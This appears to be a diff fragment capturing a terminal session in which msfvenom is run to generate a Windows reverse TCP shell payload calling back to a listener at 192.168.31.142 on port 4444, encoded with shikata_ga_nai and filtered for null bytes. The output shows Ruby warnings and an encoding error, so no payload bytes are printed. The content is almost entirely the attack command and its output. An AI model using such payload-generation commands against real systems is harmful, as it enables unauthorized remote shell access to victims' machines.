@@ -1,0 +1,6 @@
+msfvenom -p windows/shell_reverse_tcp LHOST=192.168.31.142 LPORT=4444 EXITFUNC=thread -f c --platform windows -b “\x00”
+/usr/share/metasploit-framework/vendor/bundle/ruby/2.5.0/gems/rex-text-0.2.23/lib/rex/text/hex.rb:189: warning: historical binary regexp match /.../n against UTF-8 string
+[-] No arch selected, selecting arch: x86 from the payload
+Found 11 compatible encoders
+Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
+Error: incompatible character encodings: UTF-8 and ASCII-8BIT
